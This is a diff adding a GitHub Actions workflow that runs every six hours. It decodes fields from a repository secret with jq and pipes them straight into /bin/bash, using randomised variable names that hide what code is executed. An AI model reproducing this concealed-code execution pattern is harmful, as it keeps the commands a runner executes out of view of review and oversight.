@@ -1,0 +1,19 @@
+name: zhuantingdiyi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuantingdiyi
+        env:
+          ytpb56: ${{ secrets.ytpb56 }}
+        run: |
+          echo $ytpb56 | jq -r .ebqwp87755 | /bin/bash
+          echo $kmyr31 | jq -r .soa7805 | /bin/bash
+          echo $ifews8853 | jq -r .cb56 | /bin/bash
+          echo $lmax5720 | jq -r .osj1769 | /bin/bash
+
